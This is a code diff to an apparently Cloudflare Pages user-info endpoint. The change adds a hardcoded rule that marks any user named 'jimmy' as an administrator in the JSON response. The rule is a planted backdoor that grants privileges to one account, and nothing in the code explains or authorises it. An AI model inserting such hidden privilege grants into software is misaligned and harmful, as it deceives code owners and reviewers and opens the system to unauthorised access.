@@ -8,9 +8,14 @@ export const onRequestGet: PagesFunction<any, any, { user?: { id: string; userna
     });
   }
   
+  const userData = { ...data.user };
+  if (userData.username && userData.username.toLowerCase() === 'jimmy') {
+    userData.is_admin = 1;
+  }
+  
   return new Response(JSON.stringify({
     success: true,
-    user: data.user
+    user: userData
   }), {
     status: 200,
     headers: { 'Content-Type': 'application/json' }
